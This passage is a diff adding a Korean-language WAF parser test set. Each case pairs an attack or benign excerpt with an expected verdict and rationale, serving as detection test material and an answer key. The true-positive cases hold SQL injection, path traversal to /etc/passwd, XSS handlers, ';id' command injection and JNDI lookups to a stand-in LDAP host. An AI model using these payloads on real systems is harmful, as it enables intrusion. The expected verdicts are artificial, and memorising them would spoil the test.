@@ -1,0 +1,802 @@
+[
+  {
+    "event_id": "waf-parser-v1-001",
+    "case_name": "버전 없는 요청의 SQL 조건 삽입",
+    "test_category": "parser/missing_protocol",
+    "expected_verdict": "true_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "partial",
+    "rationale_ko": "상품 식별자에 문자열 종료·참 조건·주석이 함께 삽입되어 있다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "7%27%20OR%2071%3D71--"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-002",
+    "case_name": "버전 없는 요청 헤더의 JNDI 조회식",
+    "test_category": "parser/missing_protocol",
+    "expected_verdict": "true_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "partial",
+    "rationale_ko": "사용자 제어 헤더에 외부 조회를 유도하는 JNDI 식이 있다. 조회 성공은 미확인이다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "${jndi:ldap://lookup.invalid/fixture-a}"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-003",
+    "case_name": "버전 없는 성명 검색의 작은따옴표",
+    "test_category": "parser/missing_protocol",
+    "expected_verdict": "false_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "partial",
+    "rationale_ko": "성명 안의 작은따옴표 외에 SQL 조건식이나 실행 구문은 없다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "name=O%27Reilly"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-004",
+    "case_name": "버전 없는 JSON 문서의 비교 연산자",
+    "test_category": "parser/missing_protocol",
+    "expected_verdict": "false_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "partial",
+    "rationale_ko": "평문 메모의 수학 비교식이며 실행 가능한 태그나 스크립트가 없다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "\"format\":\"plain_text\""
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-005",
+    "case_name": "버전과 요청 본문이 모두 누락된 업로드",
+    "test_category": "parser/missing_protocol",
+    "expected_verdict": "inconclusive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "partial",
+    "rationale_ko": "길이 헤더만 있고 업로드 내용이 없어 탐지된 본문을 확인할 수 없다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "Content-Length: 2048"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-006",
+    "case_name": "문자형 줄바꿈에 감싸진 UNION 구문",
+    "test_category": "parser/literal_line_escapes",
+    "expected_verdict": "true_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "partial",
+    "rationale_ko": "조회 식별자에 UNION SELECT와 주석을 넣는 공격 시도가 남아 있다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "UNION%20SELECT%20NULL,NULL--"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-007",
+    "case_name": "문자형 줄바꿈에 감싸진 경로 탈출",
+    "test_category": "parser/literal_line_escapes",
+    "expected_verdict": "true_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "partial",
+    "rationale_ko": "파일 다운로드 인자로 상위 경로 이동과 시스템 파일을 지정한다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "..%2F..%2F..%2Fetc%2Fpasswd"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-008",
+    "case_name": "문자형 줄바꿈과 Windows 설명 경로",
+    "test_category": "parser/literal_line_escapes",
+    "expected_verdict": "false_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "partial",
+    "rationale_ko": "도움말의 Windows 경로 표기이며 서버 경로 탈출이나 명령 실행 구문이 아니다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "\"format\":\"plain_text\""
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-009",
+    "case_name": "문자형 줄바꿈과 한글 검색어",
+    "test_category": "parser/literal_line_escapes",
+    "expected_verdict": "false_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "partial",
+    "rationale_ko": "일반 문서 검색어와 정렬 옵션이며 인코딩만으로 공격이라 볼 수 없다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "sort=updated"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-010",
+    "case_name": "문자형 줄바꿈 로그의 수집 중단",
+    "test_category": "parser/literal_line_escapes",
+    "expected_verdict": "inconclusive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "partial",
+    "rationale_ko": "필터의 실제 값과 객체 종료 부분이 잘려 처리 의미를 확정할 수 없다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "\"filter\":"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-011",
+    "case_name": "JSON 로그 필드 내부의 인증 우회 구문",
+    "test_category": "parser/json_export_envelope",
+    "expected_verdict": "true_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "인증 입력값에 SQL 참 조건과 주석이 들어 있다. 로그 포장과 공격 구문을 구분한다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "' OR 83=83--"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-012",
+    "case_name": "JSON 로그 필드 내부의 SVG 이벤트 핸들러",
+    "test_category": "parser/json_export_envelope",
+    "expected_verdict": "true_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "HTML 미리보기 값에 실행형 SVG 이벤트 핸들러를 삽입한다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "%3Csvg%20onload%3Dalert(83)%3E"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-013",
+    "case_name": "JSON 로그 필드 내부의 일반 CSV 내보내기",
+    "test_category": "parser/json_export_envelope",
+    "expected_verdict": "false_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "정상 형식·기간 파라미터로 실행형 표현식이 없다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "format=csv&quarter=2026Q3"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-014",
+    "case_name": "JSON 로그와 이스케이프된 예제 따옴표",
+    "test_category": "parser/json_export_envelope",
+    "expected_verdict": "false_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "문서의 JSON 표기 예시이며 이스케이프가 곧 공격을 뜻하지 않는다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "\\\"format\\\":\\\"plain_text\\\""
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-015",
+    "case_name": "JSON 내보내기에서 원문 값이 빠진 이벤트",
+    "test_category": "parser/json_export_envelope",
+    "expected_verdict": "inconclusive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "내보내기 메타데이터에 탐지 사실만 있고 원문 값이 null이다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "capture_state"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-016",
+    "case_name": "Syslog 접두사 뒤의 셸 구분자",
+    "test_category": "parser/syslog_prefixed_request",
+    "expected_verdict": "true_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "네트워크 진단 인자에 세미콜론과 별도 명령을 이어 붙인 시도다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "host=127.0.0.1%3Bid"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-017",
+    "case_name": "Syslog 접두사 뒤의 이중 인코딩 경로",
+    "test_category": "parser/syslog_prefixed_request",
+    "expected_verdict": "true_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "이중 인코딩한 상위 경로와 시스템 파일 지정이 파일 인자에 함께 있다. 서버의 실제 디코딩 횟수는 미확인이다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-018",
+    "case_name": "Syslog 접두사 뒤의 정상 상태 조회",
+    "test_category": "parser/syslog_prefixed_request",
+    "expected_verdict": "false_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "기본 상태 조회 외에 공격 구문이 없다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "/health?detail=basic"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-019",
+    "case_name": "Syslog 접두사 뒤의 허용 문자 검색",
+    "test_category": "parser/syslog_prefixed_request",
+    "expected_verdict": "false_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "일상 문구의 select 단어이며 SQL 문법 조합이 없다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "select+a+report"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-020",
+    "case_name": "Syslog 메시지에 요청 길이만 남은 경우",
+    "test_category": "parser/syslog_prefixed_request",
+    "expected_verdict": "inconclusive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "요청 원문 없이 길이와 수집 생략 표지만 남아 탐지 근거를 확인할 수 없다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "capture=omitted"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-021",
+    "case_name": "HTTP/2 텍스트 덤프의 SQL 주석 분리",
+    "test_category": "parser/http2_pseudo_headers",
+    "expected_verdict": "true_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "식별자에 문자열 종료와 주석으로 분리한 참 조건이 있다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "%27/**/OR/**/97=97--"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-022",
+    "case_name": "HTTP/2 텍스트 덤프의 이미지 오류 핸들러",
+    "test_category": "parser/http2_pseudo_headers",
+    "expected_verdict": "true_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "렌더링 대상 값에 오류 이벤트 실행 코드를 삽입한다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "onerror=alert(97)"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-023",
+    "case_name": "HTTP/2 텍스트 덤프의 날짜 범위 검색",
+    "test_category": "parser/http2_pseudo_headers",
+    "expected_verdict": "false_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "날짜 범위 파라미터로 공격 문법이 없다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "from=2026-09-01&to=2026-09-10"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-024",
+    "case_name": "HTTP/2 텍스트 덤프의 수학 설명 JSON",
+    "test_category": "parser/http2_pseudo_headers",
+    "expected_verdict": "false_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "평문 초안의 비교식이며 HTML 요소나 실행 구문이 아니다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "\"formula\":\"x < y && y > 0\""
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-025",
+    "case_name": "HTTP/2 덤프에 서로 다른 path가 중복된 경우",
+    "test_category": "parser/http2_pseudo_headers",
+    "expected_verdict": "inconclusive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "서로 다른 path가 중복되어 유효 요청·대상 경로를 확정할 수 없다. 파싱 비정상만으로 공격 성공을 추정하지 않는다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": ":path: /documents/private"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-026",
+    "case_name": "탭으로 구분한 요청 라인의 SQL 조건",
+    "test_category": "parser/tabbed_request_line",
+    "expected_verdict": "true_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "요청 라인 구분자가 비표준이어도 검색 값에 SQL 참 조건이 남아 있다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "%27%20OR%20101=101--"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-027",
+    "case_name": "탭으로 구분한 요청과 난독화 JNDI",
+    "test_category": "parser/tabbed_request_line",
+    "expected_verdict": "true_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "헤더에 lower 연산을 이용한 JNDI 외부 조회 유도식이 있다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "${${lower:j}ndi:ldap://lookup.invalid/fixture-b}"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-028",
+    "case_name": "탭으로 구분한 평범한 페이지 이동",
+    "test_category": "parser/tabbed_request_line",
+    "expected_verdict": "false_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "페이지 번호·크기 외에 악의적 구문은 없으며 로깅 구분자 이상과 공격성을 구분한다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "page=2&size=20"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-029",
+    "case_name": "탭으로 구분한 요청의 파일명 세미콜론",
+    "test_category": "parser/tabbed_request_line",
+    "expected_verdict": "false_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "문서 제목의 문장부호이며 셸 실행 인자나 후속 명령이 아니다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "title=minutes%3Bfinal.txt"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-030",
+    "case_name": "탭 구분 로그에서 내용 없이 이름만 남은 인자",
+    "test_category": "parser/tabbed_request_line",
+    "expected_verdict": "inconclusive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "값이 제거된 캡처이므로 빈 값을 근거로 원래 탐지 내용이 무해했다고 확정할 수 없다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "X-Capture-State: values-removed"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-031",
+    "case_name": "CR 단독 줄바꿈의 경로 탈출",
+    "test_category": "parser/bare_cr_and_header_folding",
+    "expected_verdict": "true_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "partial",
+    "rationale_ko": "다운로드 대상에 반복 상위 경로와 시스템 파일을 명시한다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "path=../../../../etc/passwd"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-032",
+    "case_name": "CR 단독 줄바꿈의 스크립트 삽입",
+    "test_category": "parser/bare_cr_and_header_folding",
+    "expected_verdict": "true_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "partial",
+    "rationale_ko": "HTML 미리보기 본문에 직접 실행형 스크립트를 넣는다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "<script>alert(109)</script>"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-033",
+    "case_name": "접힌 설명 헤더의 문서용 키워드",
+    "test_category": "parser/bare_cr_and_header_folding",
+    "expected_verdict": "false_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "partial",
+    "rationale_ko": "접힌 설명 헤더의 일반 문구이며 쿼리 삽입 문법이 아니다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "X-Description: select a page"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-034",
+    "case_name": "CR 단독 줄바꿈의 이름 JSON",
+    "test_category": "parser/bare_cr_and_header_folding",
+    "expected_verdict": "false_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "partial",
+    "rationale_ko": "이름의 아포스트로피로 SQL 조건·주석 조합은 없다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "D'Angelo"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-035",
+    "case_name": "접힌 인증 헤더의 값이 중단된 로그",
+    "test_category": "parser/bare_cr_and_header_folding",
+    "expected_verdict": "inconclusive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "partial",
+    "rationale_ko": "인증값이 이어지는 부분과 판단에 필요한 탐지 내용이 잘려 있다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "Authorization: Bearer"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-036",
+    "case_name": "요청 라인 없이 남은 인증 JSON",
+    "test_category": "parser/body_only_capture",
+    "expected_verdict": "true_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "인증 필드의 문자열 종료·참 조건·주석이 본문에 남아 있다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "' OR 113=113--"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-037",
+    "case_name": "요청 라인 없이 남은 파일 조회 JSON",
+    "test_category": "parser/body_only_capture",
+    "expected_verdict": "true_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "파일 다운로드 동작과 경로 탈출 값이 함께 남아 있다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "../../../../etc/passwd"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-038",
+    "case_name": "본문만 남은 일반 연락처 JSON",
+    "test_category": "parser/body_only_capture",
+    "expected_verdict": "false_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "일반 이름·부서·수량이며 작은따옴표 외에 SQL 의미가 없다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "O'Reilly"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-039",
+    "case_name": "본문만 남은 보안 교육 평문 JSON",
+    "test_category": "parser/body_only_capture",
+    "expected_verdict": "false_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "보안 문서의 평문 설명이며 실행형 공격 구문이 없다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "\"format\":\"plain_text\""
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-040",
+    "case_name": "본문도 복원되지 않은 gzip 표시",
+    "test_category": "parser/body_only_capture",
+    "expected_verdict": "inconclusive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "failed",
+    "rationale_ko": "압축 본문이 제공되지 않아 원래 요청의 공격성을 판단할 수 없다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "captured_bytes=0"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-041",
+    "case_name": "Multipart 폼 필드의 명령 연결",
+    "test_category": "parser/multipart_and_duplicate_fields",
+    "expected_verdict": "true_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "success",
+    "rationale_ko": "진단 대상 폼 값에 별도 셸 명령을 이어 붙인다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "127.0.0.1;id"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-042",
+    "case_name": "인코딩된 쿼리 이름과 중복 값의 SQL 삽입",
+    "test_category": "parser/multipart_and_duplicate_fields",
+    "expected_verdict": "true_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "success",
+    "rationale_ko": "반복 식별자 중 하나에 명확한 SQL 조건 삽입이 있다. 서버가 어느 값을 쓰는지는 성공 여부와 별개다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "item%5Fid=7%27%20OR%20127=127--"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
